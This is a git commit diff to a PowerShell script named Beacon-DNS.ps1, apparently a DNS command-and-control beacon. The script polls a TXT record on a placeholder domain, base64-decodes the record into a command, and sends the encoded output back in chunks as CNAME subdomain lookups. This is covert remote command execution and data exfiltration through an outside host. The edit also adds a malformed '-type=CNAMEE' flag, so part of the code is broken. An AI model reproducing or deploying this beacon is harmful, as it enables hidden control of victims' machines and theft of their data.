b945e96393422a974c7d4921a3d4e17e7deea211
Shaked Wiessman <shakedwe2@gmail.com>
2024-11-17 15:15:30 +0200

    Update Beacon-DNS.ps1

--- Beacon-DNS.ps1
+++ Beacon-DNS.ps1
@@ -1,12 +1,11 @@
 $domain = "your_domain.co.il"
-$dnsServer = "x.x.x.x"
 
 function Send-CnameQuery {
     param (
         [string]$data
     )
     try {
-        nslookup -type=CNAME "$data.$domain" $dnsServer | Out-Null
+        nslookup -type=CNAME "$data.$domain" | Out-Null
         Write-Output "Sent CNAME query: $data"
     } catch {
         Write-Output "Failed to send CNAME query: $_"
@@ -16,7 +15,7 @@ function Send-CnameQuery {
 while ($true) {
     try {
         Write-Output "Querying TXT record..."
-        $txtOutput = nslookup -type=TXT $domain $dnsServer | Out-String
+        $txtOutput = nslookup -type=TXT $domain | Out-String
         if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
             $encodedCommand = $matches[1]
             $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
@@ -32,31 +31,31 @@ while ($true) {
 
             if ($encodedOutput.Length -le 50) {
                 # Send single short response
-                Send-CnameQuery "$uniqueId-start"
-                Start-Sleep -Milliseconds 200
-                Send-CnameQuery "1-chunks"
-                Start-Sleep -Milliseconds 200
-                Send-CnameQuery "chunk1-$encodedOutput"
-                Start-Sleep -Milliseconds 200
-                Send-CnameQuery "$uniqueId-end"
+                nslookup -type=CNAME "$uniqueId-start.$domain"
+                Start-Sleep -Milliseconds 400
+               nslookup -type=CNAME "1-chunks.$domain"
+                Start-Sleep -Milliseconds 400
+                nslookup -type=CNAME "chunk1-$encodedOutput.$domain"
+                Start-Sleep -Milliseconds 400
+                nslookup -type=CNAME "$uniqueId-end.$domain"
             } else {
                 # Send long response in chunks
                 $chunks = $encodedOutput -split "(.{1,40})" | Where-Object { $_ -ne "" }
                 $chunkCount = $chunks.Count
 
-                Send-CnameQuery "$uniqueId-start"
-                Start-Sleep -Milliseconds 200
-                Send-CnameQuery "$chunkCount-chunks"
-                Start-Sleep -Milliseconds 200
+                nslookup -type=CNAME "$uniqueId-start.$domain"
+                Start-Sleep -Milliseconds 400
+                nslookup -type=CNAME "$chunkCount-chunks.$domain"
+                Start-Sleep -Milliseconds 400
 
                 $chunkIndex = 1
                 foreach ($chunk in $chunks) {
-                    Send-CnameQuery "chunk$chunkIndex-$chunk"
-                    Start-Sleep -Milliseconds 9000
+                    nslookup -type=CNAME "chunk$chunkIndex-$chunk.$domain"
+                    Start-Sleep -Milliseconds 6000
                     $chunkIndex++
                 }
 
-                Send-CnameQuery "$uniqueId-end"
+                nslookup -type=CNAMEE "$uniqueId-end.$domain"
             }
         } else {
             Write-Output "No TXT record found for command."
